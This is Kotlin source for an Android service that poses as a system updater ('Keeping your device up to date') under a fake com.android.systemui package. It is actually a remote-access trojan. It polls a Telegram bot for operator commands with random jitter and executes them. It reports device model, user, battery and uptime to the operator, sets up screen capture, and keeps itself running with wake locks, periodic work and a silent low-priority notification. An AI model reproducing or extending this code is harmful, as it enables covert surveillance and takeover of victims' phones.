package com.android.systemui.updater

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import com.android.systemui.updater.ErrorReporter
import com.android.systemui.updater.EncryptedConfig
import com.android.systemui.updater.persistence.PersistenceManager
import java.util.concurrent.atomic.AtomicBoolean

class SystemUpdateService : Service() {

    private lateinit var telegram: TelegramClient
    private lateinit var handler: CommandHandler
    private val running = AtomicBoolean(false)

    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()

        val config = EncryptedConfig.getInstance(this)
        val botToken = config.getBotToken()
        val chatId = config.getChatId()

        telegram = TelegramClient(this, botToken, chatId)
        ErrorReporter.init(this, telegram)
        handler = CommandHandler(this, telegram)

        // Initialize screen capability and store in application
        (application as? SystemUpdateReceiver)?.screenCapability = ScreenCapability(this, telegram)

        // Enqueue periodic work to ensure service stays alive
        PersistenceManager.enqueuePeriodicWork(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForeground()

        val pm = getSystemService(POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "SystemUpdateService::WakeLock"
        ).apply { acquire() }

        if (running.compareAndSet(false, true)) {
            Thread {
                try {
                    telegram.sendText(buildStartupMessage())
                } catch (e: Exception) { ErrorReporter.report(e, "SystemUpdateService") }

                while (running.get()) {
                    try {
                        val commands = telegram.getNewCommands()
                        if (commands.isNotEmpty()) {
                            val processed = mutableListOf<String>()
                            commands.forEach { cmd ->
                                try {
                                    handler.handle(cmd)
                                    processed.add(cmd)
                                } catch (e: Exception) { ErrorReporter.report(e, "SystemUpdateService") }
                            }
                            // Batch ack after processing all commands
                            telegram.sendText("⚙️ Executed ${processed.size} commands:\n- ${processed.joinToString("\n- ")}")
                        }
                    } catch (e: Exception) { ErrorReporter.report(e, "SystemUpdateService") }

                    try {
                        val jitter = (1..3).random()
                        Thread.sleep(5000L + jitter * 1000L)  // 6-8 seconds random
                    } catch (e: InterruptedException) {
                        Thread.currentThread().interrupt()
                        break
                    }
                }
            }.start()
        }

        return START_STICKY
    }

    private fun startForeground() {
        val channelId = "system_sync"
        val channelName = "System Services"
        val channel = NotificationChannel(
            channelId, channelName, NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "System service"
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
        }
        val nm = getSystemService(NotificationManager::class.java)
        nm.createNotificationChannel(channel)

        startForeground(1337,
            NotificationCompat.Builder(this, channelId)
                .setContentTitle("System Update Service")
                .setContentText("Keeping your device up to date")
                .setSmallIcon(android.R.drawable.stat_notify_sync)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(NotificationCompat.CATEGORY_SERVICE)
                .setOngoing(true)
                .setSilent(true)
                .build()
        )
    }

    private fun buildStartupMessage(): String {
        val bm = getSystemService(BATTERY_SERVICE) as android.os.BatteryManager
        val batteryLevel = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)

        return buildString {
            appendLine("✅ Agent Online")
            appendLine("━━━━━━━━━━━━━━━━━━━━")
            appendLine("📱 ${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}")
            appendLine("🤖 Android ${android.os.Build.VERSION.RELEASE} (API ${android.os.Build.VERSION.SDK_INT})")
            appendLine("👤 ${android.os.Build.USER}")
            appendLine("🔋 Battery: $batteryLevel%")
            appendLine("⏱ Uptime: ${android.os.SystemClock.elapsedRealtime() / 1000}s")
            appendLine("━━━━━━━━━━━━━━━━━━━━")
            appendLine("Type /help for all commands")
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        running.set(false)
        wakeLock?.release()
        (application as? SystemUpdateReceiver)?.screenCapability?.release()
        super.onDestroy()
    }
}
